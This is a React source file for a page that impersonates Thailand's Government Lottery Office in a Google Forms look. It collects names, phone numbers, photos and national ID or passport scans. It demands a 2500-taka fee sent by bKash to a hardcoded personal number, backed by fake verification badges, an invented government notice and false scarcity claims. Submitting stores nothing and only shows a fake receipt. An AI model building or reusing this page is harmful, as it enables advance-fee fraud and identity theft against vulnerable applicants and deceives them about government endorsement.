import React, { useState } from 'react';
import { Link } from 'react-router-dom';

export default function OnlineForm({ isStandalonePage = false }) {
  const [formData, setFormData] = useState({
    name: '',
    phone: '',
    country: 'বাংলাদেশ (Bangladesh)',
    customCountry: '',
    govtPaymentMethod: 'Visa',
    bkashSenderNumber: '',
    bkashTrxId: ''
  });

  const [photoFile, setPhotoFile] = useState(null);
  const [nidFile, setNidFile] = useState(null);
  const [activeCard, setActiveCard] = useState('name');
  const [copiedBkash, setCopiedBkash] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const bkashNumber = '01910243177';

  const countryList = [
    'বাংলাদেশ (Bangladesh)',
    'সৌদি আরব (Saudi Arabia)',
    'সংযুক্ত আরব আমিরাত (UAE - Dubai)',
    'কাতার (Qatar)',
    'ওমান (Oman)',
    'কুয়েত (Kuwait)',
    'বাহরাইন (Bahrain)',
    'মালয়েশিয়া (Malaysia)',
    'সিঙ্গাপুর (Singapore)',
    'থাইল্যান্ড (Thailand)',
    'অন্যান্য দেশ (Other Country)'
  ];

  const govtPaymentOptions = [
    {
      id: 'Visa',
      name: 'Visa Card (ভিসা কার্ড)',
      desc: 'আন্তর্জাতিক ডেবিট / ক্রেডিট কার্ড পেমেন্ট',
      badge: 'VISA',
      badgeClass: 'visa'
    },
    {
      id: 'Mastercard',
      name: 'Mastercard (মাস্টারকার্ড)',
      desc: 'আন্তর্জাতিক মাস্টারকার্ড পেমেন্ট গেটওয়ে',
      badge: 'Mastercard',
      badgeClass: 'mastercard'
    },
    {
      id: 'American Express',
      name: 'American Express (অ্যামেক্স কার্ড)',
      desc: 'গ্লোবাল অ্যামেক্স মেম্বারশিপ গেটওয়ে',
      badge: 'AMEX',
      badgeClass: 'amex'
    },
    {
      id: 'Bank Transfer',
      name: 'Direct Bank Transfer (সরাসরি ব্যাংক ট্রান্সফার)',
      desc: 'থাইল্যান্ড সেন্ট্রাল ব্যাংক অনুমোদিত ট্রেজারি একাউন্ট',
      badge: 'BANK',
      badgeClass: 'bank'
    }
  ];

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handlePhotoUpload = (e) => {
    const file = e.target.files && e.target.files[0];
    if (file) {
      setPhotoFile({
        name: file.name,
        size: (file.size / 1024).toFixed(1) + ' KB',
        preview: URL.createObjectURL(file)
      });
    }
  };

  const handleNidUpload = (e) => {
    const file = e.target.files && e.target.files[0];
    if (file) {
      setNidFile({
        name: file.name,
        size: (file.size / 1024).toFixed(1) + ' KB',
        preview: file.type.startsWith('image/') ? URL.createObjectURL(file) : null
      });
    }
  };

  const copyBkashNumber = () => {
    if (navigator.clipboard) {
      navigator.clipboard.writeText(bkashNumber);
    }
    setCopiedBkash(true);
    setTimeout(() => setCopiedBkash(false), 2500);
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    if (!photoFile) {
      alert('অনুগ্রহ করে আপনার ১ কপি পাসপোর্ট সাইজ ছবি আপলোড করুন।');
      setActiveCard('photo');
      return;
    }

    if (!nidFile) {
      alert('অনুগ্রহ করে আপনার জাতীয় পরিচয়পত্র (NID) বা পাসপোর্ট আপলোড করুন।');
      setActiveCard('nid');
      return;
    }

    if (!formData.bkashSenderNumber || !formData.bkashTrxId) {
      alert('অনুগ্রহ করে বিকাশের প্রেরক নম্বর এবং ট্রানজেকশন আইডি (TrxID) প্রদান করুন।');
      setActiveCard('bkash');
      return;
    }

    setIsSubmitting(true);
    setTimeout(() => {
      setIsSubmitting(false);
      setSubmitted(true);
      window.scrollTo({ top: 120, behavior: 'smooth' });
    }, 1200);
  };

  const resetForm = () => {
    setFormData({
      name: '',
      phone: '',
      country: 'বাংলাদেশ (Bangladesh)',
      customCountry: '',
      govtPaymentMethod: 'Visa',
      bkashSenderNumber: '',
      bkashTrxId: ''
    });
    setPhotoFile(null);
    setNidFile(null);
    setActiveCard('name');
    setSubmitted(false);
  };

  return (
    <section
      className={`section form-section ${isStandalonePage ? 'standalone-form-section' : 'reveal-on-scroll'}`}
      id="online-form"
    >
      <div className="google-form-container" aria-label="Google Forms Style Official Registration">
        {/* Google Form Top Card */}
        <div className="gform-top-card">
          <div className="gform-color-stripe" />
          <div className="gform-header-content">
            <div className="gform-logo-row">
              <span className="brand-mark gform-brand-mark" aria-hidden="true">
                <img
                  src="/assets/logo.png?v=4"
                  alt="Thailand Lottery Official Logo"
                  className="brand-logo"
                  width="64"
                  height="64"
                />
              </span>
              <div className="gform-official-text">
                <div className="gform-verified-badge-line">
                  <span className="gform-govt-seal">สำนักงานสลากกินแบ่งรัฐบาล • GLO BANGKOK</span>
                  <span className="gform-verified-tag">
                    <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true">
                      <path
                        fill="#1D9BF0"
                        d="M22.25 12c0-1.43-.88-2.67-2.19-3.19.46-1.39.2-2.9-.81-3.91s-2.52-1.27-3.91-.81c-.52-1.31-1.76-2.19-3.19-2.19s-2.67.88-3.19 2.19c-1.39-.46-2.9-.2-3.91.81s-1.27 2.52-.81 3.91C2.93 9.33 2.05 10.57 2.05 12s.88 2.67 2.19 3.19c-.46 1.39-.2 2.9.81 3.91s2.52 1.27 3.91.81c.52 1.31 1.76 2.19 3.19 2.19s2.67-.88 3.19-2.19c1.39.46 2.9.2 3.91-.81s1.27-2.52.81-3.91c1.31-.52 2.19-1.76 2.19-3.19z"
                      />
                      <path
                        fill="#FFFFFF"
                        d="M10.09 16.72l-4.14-4.14 1.41-1.41 2.73 2.73 6.13-6.13 1.41 1.41-7.54 7.54z"
                      />
                    </svg>
                    <span>সরকারি অনুমোদিত পোর্টাল</span>
                  </span>
                </div>
                <h1 className="gform-main-heading">Thailand Official Lottery Membership Form 2026</h1>
                <p className="gform-subtext">
                  থাইল্যান্ড সরকারের গভর্নমেন্ট লটারি অফিস (GLO) দ্বারা সরাসরি নিয়ন্ত্রিত অফিসিয়াল অনলাইন আবেদনপত্র।
                  সঠিক তথ্য প্রদান করে মেম্বারশিপ আবেদন সম্পন্ন করুন।
                </p>
              </div>
            </div>

            <div className="gform-meta-banner">
              <span className="gform-fee-pill">
                🏛️ সরকারি কোটা ফি: <strong>২৫০০ টাকা (VIP Quota)</strong>
              </span>
              <span className="gform-quota-pill">
                🚨 অবশিষ্ট কোটা: <strong>আর মাত্র ৫টি ফর্ম বাকি</strong>
              </span>
            </div>

            <div className="gform-notice-box">
              <p>
                ⚠️ দয়া করে সমস্ত সঠিক ও বৈধ তথ্য প্রদান করুন। ছবি ও পরিচয়পত্রের স্পষ্ট কপি আপলোড করা বাধ্যতামূলক।
              </p>
              <span className="gform-required-note">* নির্দেশিত ঘরগুলো পূরণ করা বাধ্যতামূলক (* Indicates required question)</span>
            </div>
          </div>
        </div>

        {submitted ? (
          /* Google Form Response Submitted Screen */
          <div className="gform-success-card">
            <div className="gform-color-stripe" />
            <div className="gform-success-body">
              <div className="gform-success-check-badge">✓</div>
              <h2 className="gform-success-title">আপনার আবেদন সফলভাবে জমা হয়েছে!</h2>
              <p className="gform-success-subtitle">
                Your response has been recorded. থাইল্যান্ড গভর্নমেন্ট লটারি অফিস (GLO) মেম্বারশিপ পোর্টালে আপনার তথ্য সংরক্ষিত হয়েছে।
              </p>

              <div className="gform-receipt-summary">
                <div className="gform-receipt-header">
                  <span>📄 আবেদনপত্র রিসিট (Submission Receipt)</span>
                  <span className="receipt-tag">STATUS: PENDING VERIFICATION</span>
                </div>
                <div className="gform-receipt-grid">
                  <div className="receipt-row">
                    <span className="receipt-label">আবেদনকারীর নাম:</span>
                    <strong className="receipt-value">{formData.name}</strong>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-label">মোবাইল / হোয়াটসঅ্যাপ:</span>
                    <strong className="receipt-value">{formData.phone}</strong>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-label">বর্তমান দেশ:</span>
                    <strong className="receipt-value">
                      {formData.country === 'অন্যান্য দেশ (Other Country)' ? formData.customCountry : formData.country}
                    </strong>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-label">ছবি আপলোড:</span>
                    <strong className="receipt-value file-ok">✓ {photoFile ? photoFile.name : 'আপলোড সম্পন্ন'}</strong>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-label">NID / পাসপোর্ট:</span>
                    <strong className="receipt-value file-ok">✓ {nidFile ? nidFile.name : 'আপলোড সম্পন্ন'}</strong>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-label">থাইল্যান্ড সরকারি পেমেন্ট মেথড:</span>
                    <strong className="receipt-value highlight-govt">{formData.govtPaymentMethod}</strong>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-label">বিকাশ প্রেরক নম্বর:</span>
                    <strong className="receipt-value">{formData.bkashSenderNumber}</strong>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-label">বিকাশ TrxID:</span>
                    <strong className="receipt-value highlight-trx">{formData.bkashTrxId}</strong>
                  </div>
                </div>
              </div>

              <div className="gform-success-action-group">
                <button
                  type="button"
                  className="button secondary gform-reset-btn"
                  onClick={resetForm}
                >
                  নতুন আবেদন জমা দিন (Submit another response)
                </button>
              </div>
            </div>
          </div>
        ) : (
          <form className="gform-body" onSubmit={handleSubmit} noValidate>
            {/* 1. Name Card */}
            <div
              className={`gform-question-card ${activeCard === 'name' ? 'is-active-card' : ''}`}
              onClick={() => setActiveCard('name')}
            >
              <div className="gform-card-left-indicator" aria-hidden="true" />
              <label className="gform-question-title" htmlFor="gform-name">
                আপনার নাম (Full Name) <span className="gform-req">*</span>
              </label>
              <p className="gform-question-desc">জাতীয় পরিচয়পত্র বা পাসপোর্ট অনুযায়ী আপনার পূর্ণ নাম লিখুন</p>
              <div className="gform-input-wrapper">
                <input
                  id="gform-name"
                  name="name"
                  type="text"
                  required
                  className="gform-underline-input"
                  placeholder="Short answer text"
                  value={formData.name}
                  onChange={handleChange}
                  onFocus={() => setActiveCard('name')}
                />
                <span className="gform-input-focus-line" aria-hidden="true" />
              </div>
            </div>

            {/* 2. Phone / WhatsApp Card */}
            <div
              className={`gform-question-card ${activeCard === 'phone' ? 'is-active-card' : ''}`}
              onClick={() => setActiveCard('phone')}
            >
              <div className="gform-card-left-indicator" aria-hidden="true" />
              <label className="gform-question-title" htmlFor="gform-phone">
                ফোন / হোয়াটসঅ্যাপ নম্বর (Phone / WhatsApp Number) <span className="gform-req">*</span>
              </label>
              <p className="gform-question-desc">যে নম্বরে লাইভ রেজাল্ট ও মেম্বারশিপ কনফার্মেশন কোড পাঠানো হবে</p>
              <div className="gform-input-wrapper">
                <input
                  id="gform-phone"
                  name="phone"
                  type="tel"
                  required
                  className="gform-underline-input"
                  placeholder="+880 / +966 ইত্যাদি কান্ট্রি কোডসহ নম্বর দিন..."
                  value={formData.phone}
                  onChange={handleChange}
                  onFocus={() => setActiveCard('phone')}
                />
                <span className="gform-input-focus-line" aria-hidden="true" />
              </div>
            </div>

            {/* 3. Country Name Card */}
            <div
              className={`gform-question-card ${activeCard === 'country' ? 'is-active-card' : ''}`}
              onClick={() => setActiveCard('country')}
            >
              <div className="gform-card-left-indicator" aria-hidden="true" />
              <label className="gform-question-title" htmlFor="gform-country">
                দেশের নাম (Country Name) <span className="gform-req">*</span>
              </label>
              <p className="gform-question-desc">আপনি বর্তমানে যে দেশে অবস্থান করছেন তা নির্বাচন করুন</p>
              <div className="gform-select-wrapper">
                <select
                  id="gform-country"
                  name="country"
                  required
                  className="gform-dropdown-select"
                  value={formData.country}
                  onChange={handleChange}
                  onFocus={() => setActiveCard('country')}
                >
                  {countryList.map((c) => (
                    <option key={c} value={c}>
                      {c}
                    </option>
                  ))}
                </select>
                <span className="gform-dropdown-arrow" aria-hidden="true">▼</span>
              </div>

              {formData.country === 'অন্যান্য দেশ (Other Country)' && (
                <div className="gform-input-wrapper gform-sub-input">
                  <input
                    name="customCountry"
                    type="text"
                    required
                    className="gform-underline-input"
                    placeholder="আপনার দেশের নাম লিখুন..."
                    value={formData.customCountry}
                    onChange={handleChange}
                  />
                  <span className="gform-input-focus-line" aria-hidden="true" />
                </div>
              )}
            </div>

            {/* 4. Photo Upload Card */}
            <div
              className={`gform-question-card ${activeCard === 'photo' ? 'is-active-card' : ''}`}
              onClick={() => setActiveCard('photo')}
            >
              <div className="gform-card-left-indicator" aria-hidden="true" />
              <div className="gform-question-title">
                প্রার্থীর পাসপোর্ট সাইজ ছবি (Photo Upload) <span className="gform-req">*</span>
              </div>
              <p className="gform-question-desc">
                আবেদনকারীর ১ কপি সাম্প্রতিক স্পষ্ট পাসপোর্ট সাইজ ছবি আপলোড করুন (JPG, PNG সর্বোচ্চ 10MB)
              </p>

              {photoFile ? (
                <div className="gform-file-card-preview">
                  <div className="gform-file-thumb">
                    <img src={photoFile.preview} alt="Passport preview" />
                  </div>
                  <div className="gform-file-details">
                    <span className="gform-file-name">{photoFile.name}</span>
                    <span className="gform-file-size">{photoFile.size} • ছবি আপলোড সম্পন্ন</span>
                  </div>
                  <button
                    type="button"
                    className="gform-file-remove-btn"
                    title="ফাইল মুছে নতুন ছবি দিন"
                    onClick={() => setPhotoFile(null)}
                  >
                    ✕
                  </button>
                </div>
              ) : (
                <div className="gform-upload-action-box">
                  <label htmlFor="gform-photo-input" className="gform-add-file-btn">
                    <svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true">
                      <path
                        fill="#1A73E8"
                        d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"
                      />
                    </svg>
                    <span>Add file (ছবি আপলোড করুন)</span>
                  </label>
                  <input
                    id="gform-photo-input"
                    type="file"
                    accept="image/png, image/jpeg, image/jpg, image/webp"
                    className="gform-hidden-file-input"
                    onChange={handlePhotoUpload}
                    onFocus={() => setActiveCard('photo')}
                  />
                  <span className="gform-upload-hint">অথবা ফাইল টেনে এনে এখানে ছেড়ে দিন</span>
                </div>
              )}
            </div>

            {/* 5. NID / Passport Upload Card */}
            <div
              className={`gform-question-card ${activeCard === 'nid' ? 'is-active-card' : ''}`}
              onClick={() => setActiveCard('nid')}
            >
              <div className="gform-card-left-indicator" aria-hidden="true" />
              <div className="gform-question-title">
                জাতীয় পরিচয়পত্র বা পাসপোর্ট আপলোড (NID / Passport Upload) <span className="gform-req">*</span>
              </div>
              <p className="gform-question-desc">
                জাতীয় পরিচয়পত্র (NID) অথবা পাসপোর্টের প্রথম পাতার স্পষ্ট ছবি বা স্ক্যান কপি আপলোড করুন
              </p>

              {nidFile ? (
                <div className="gform-file-card-preview">
                  <div className="gform-file-thumb">
                    {nidFile.preview ? (
                      <img src={nidFile.preview} alt="NID preview" />
                    ) : (
                      <span className="gform-pdf-icon">📄</span>
                    )}
                  </div>
                  <div className="gform-file-details">
                    <span className="gform-file-name">{nidFile.name}</span>
                    <span className="gform-file-size">{nidFile.size} • ডকুমেন্ট সংযুক্ত হয়েছে</span>
                  </div>
                  <button
                    type="button"
                    className="gform-file-remove-btn"
                    title="ফাইল মুছে নতুন ডকুমেন্ট দিন"
                    onClick={() => setNidFile(null)}
                  >
                    ✕
                  </button>
                </div>
              ) : (
                <div className="gform-upload-action-box">
                  <label htmlFor="gform-nid-input" className="gform-add-file-btn">
                    <svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true">
                      <path
                        fill="#1A73E8"
                        d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"
                      />
                    </svg>
                    <span>Add file (NID / পাসপোর্ট আপলোড করুন)</span>
                  </label>
                  <input
                    id="gform-nid-input"
                    type="file"
                    accept="image/png, image/jpeg, image/jpg, image/webp, application/pdf"
                    className="gform-hidden-file-input"
                    onChange={handleNidUpload}
                    onFocus={() => setActiveCard('nid')}
                  />
                  <span className="gform-upload-hint">পিডিএফ বা স্পষ্ট ছবি (সর্বোচ্চ 10MB)</span>
                </div>
              )}
            </div>

            {/* 6. Payment to Thailand Government Card */}
            <div
              className={`gform-question-card ${activeCard === 'govt-payment' ? 'is-active-card' : ''}`}
              onClick={() => setActiveCard('govt-payment')}
            >
              <div className="gform-card-left-indicator" aria-hidden="true" />
              <div className="gform-question-title">
                Payment to Thailand Government (থাইল্যান্ড গভর্নমেন্ট পেমেন্ট নির্বাচন) <span className="gform-req">*</span>
              </div>
              <p className="gform-question-desc">
                থাইল্যান্ড গভর্নমেন্ট লটারি অফিস (GLO) কেন্দ্রীয় ট্রেজারির আন্তর্জাতিক পেমেন্ট মেথড নির্বাচন করুন
              </p>

              <div className="gform-radio-group">
                {govtPaymentOptions.map((opt) => (
                  <label
                    key={opt.id}
                    className={`gform-radio-row ${formData.govtPaymentMethod === opt.id ? 'is-checked' : ''}`}
                  >
                    <input
                      type="radio"
                      name="govtPaymentMethod"
                      value={opt.id}
                      checked={formData.govtPaymentMethod === opt.id}
                      onChange={handleChange}
                      onFocus={() => setActiveCard('govt-payment')}
                      className="gform-radio-circle"
                    />
                    <div className="gform-radio-label-wrap">
                      <div className="gform-radio-title-line">
                        <span className={`gform-pay-badge ${opt.badgeClass}`}>{opt.badge}</span>
                        <strong className="gform-radio-main-text">{opt.name}</strong>
                      </div>
                      <span className="gform-radio-sub-text">{opt.desc}</span>
                    </div>
                  </label>
                ))}
              </div>

              <div className="gform-govt-notice">
                <span className="gform-shield-icon">🛡️</span>
                <span>অফিসিয়াল গভমেন্ট অথোরাইজেশন: GLO Notice 001/2566 ভেরিফাইড আন্তর্জাতিক ট্রেজারি গেটওয়ে।</span>
              </div>
            </div>

            {/* 7. Membership Final Payment — বিকাশ (bKash Payment) */}
            <div
              className={`gform-question-card gform-bkash-card ${activeCard === 'bkash' ? 'is-active-card' : ''}`}
              onClick={() => setActiveCard('bkash')}
            >
              <div className="gform-card-left-indicator" aria-hidden="true" />
              <div className="gform-question-title">
                মেম্বারশিপ ফাইনাল পেমেন্ট — বিকাশ (Final Membership Payment via bKash){' '}
                <span className="gform-req">*</span>
              </div>
              <p className="gform-question-desc">
                মেম্বারশিপ ও ভিআইপি কোটা নিশ্চিত করতে নিচে উল্লেখিত অফিসিয়াল বিকাশ নম্বরে Send Money সম্পন্ন করুন
              </p>

              {/* Elite bKash Official Box */}
              <div className="gform-bkash-box">
                <div className="bkash-header-bar">
                  <div className="bkash-logo-brand">
                    <span className="bkash-bird-icon">🌸</span>
                    <strong>bKash Payment</strong>
                  </div>
                  <span className="bkash-type-badge">Send Money (পার্সোনাল)</span>
                </div>

                <div className="bkash-number-row">
                  <div className="bkash-num-info">
                    <span className="bkash-num-label">অফিসিয়াল বিকাশ নম্বর:</span>
                    <strong className="bkash-display-number">{bkashNumber}</strong>
                  </div>
                  <button
                    type="button"
                    className={`bkash-copy-btn ${copiedBkash ? 'copied' : ''}`}
                    onClick={copyBkashNumber}
                  >
                    {copiedBkash ? '✓ কপি হয়েছে!' : '📋 নম্বর কপি করুন'}
                  </button>
                </div>

                <div className="bkash-fee-strip">
                  <span>মেম্বারশিপ রেজিস্ট্রেশন ফি:</span>
                  <strong className="bkash-fee-amount">২৫০০ টাকা (SAR 2500 সমমান কোটা)</strong>
                </div>

                <div className="bkash-instructions-box">
                  <p>
                    <strong>📌 বিকাশ পেমেন্ট নির্দেশিকা:</strong>
                    <br />
                    ১. আপনার বিকাশ অ্যাপ অথবা <strong>*247#</strong> ডায়াল করুন।
                    <br />
                    ২. <strong>Send Money</strong> অপশন নির্বাচন করে উপরের বিকাশ নম্বরটিতে <strong>২৫০০ টাকা</strong> পাঠান।
                    <br />
                    ৩. সফলভাবে টাকা পাঠানোর পর প্রাপ্ত <strong>TrxID</strong> এবং আপনার বিকাশ নম্বর নিচে লিখুন।
                  </p>
                </div>
              </div>

              {/* bKash Sender Number Input */}
              <div className="gform-bkash-inputs-group">
                <div className="gform-input-subcard">
                  <label className="gform-sub-label" htmlFor="gform-bkash-sender">
                    যে বিকাশ নম্বর থেকে টাকা পাঠিয়েছেন (Sender bKash Number) <span className="gform-req">*</span>
                  </label>
                  <div className="gform-input-wrapper">
                    <input
                      id="gform-bkash-sender"
                      name="bkashSenderNumber"
                      type="tel"
                      required
                      className="gform-underline-input"
                      placeholder="01XXXXXXXXX"
                      value={formData.bkashSenderNumber}
                      onChange={handleChange}
                      onFocus={() => setActiveCard('bkash')}
                    />
                    <span className="gform-input-focus-line" aria-hidden="true" />
                  </div>
                </div>

                {/* bKash Transaction ID Input */}
                <div className="gform-input-subcard">
                  <label className="gform-sub-label" htmlFor="gform-bkash-trx">
                    বিকাশ ট্রানজেকশন আইডি (bKash TrxID) <span className="gform-req">*</span>
                  </label>
                  <div className="gform-input-wrapper">
                    <input
                      id="gform-bkash-trx"
                      name="bkashTrxId"
                      type="text"
                      required
                      className="gform-underline-input"
                      placeholder="উদাহরণ: BKA89XZ123"
                      value={formData.bkashTrxId}
                      onChange={handleChange}
                      onFocus={() => setActiveCard('bkash')}
                    />
                    <span className="gform-input-focus-line" aria-hidden="true" />
                  </div>
                </div>
              </div>
            </div>

            {/* Bottom Actions */}
            <div className="gform-action-bar">
              <button
                type="submit"
                disabled={isSubmitting}
                className="gform-google-submit-btn"
              >
                {isSubmitting ? 'প্রসেসিং হচ্ছে...' : 'Submit (আবেদন জমা দিন)'}
              </button>

              <button
                type="button"
                className="gform-clear-form-btn"
                onClick={resetForm}
              >
                Clear form (ফর্ম ক্লিয়ার করুন)
              </button>
            </div>

            <div className="gform-footer-disclaimer">
              <span>Never submit passwords through Google Forms.</span>
              <p>This content is neither created nor endorsed by Google. - <u>Report Abuse</u> - <u>Terms of Service</u> - <u>Privacy Policy</u></p>
              <div className="gform-google-branding">
                <strong>Google</strong> Forms
              </div>
            </div>
          </form>
        )}
      </div>

      {/* 3 Set Game Button Section Directly After Form */}
      <div className="three-set-cta-wrapper">
        <div className="three-set-cta-card">
          <div className="three-set-glow-ring" aria-hidden="true" />
          <div className="three-set-card-content">
            <span className="three-set-badge-tag">✦ VIP OFFICIAL ✦</span>
            <p className="three-set-notice">থাইল্যান্ড লটারি অফিসিয়াল ৩ সেট গেম পেপার দেখতে নিচে ক্লিক করুন:</p>
            <Link to="/3-set-game" className="three-set-glowing-btn" aria-label="Open 3 set game document">
              <span className="three-set-shimmer" aria-hidden="true" />
              <span className="three-set-icon" aria-hidden="true">👑</span>
              <span className="three-set-text">3 set game</span>
              <span className="three-set-arrow" aria-hidden="true">➔</span>
            </Link>
          </div>
        </div>
      </div>
    </section>
  );
}
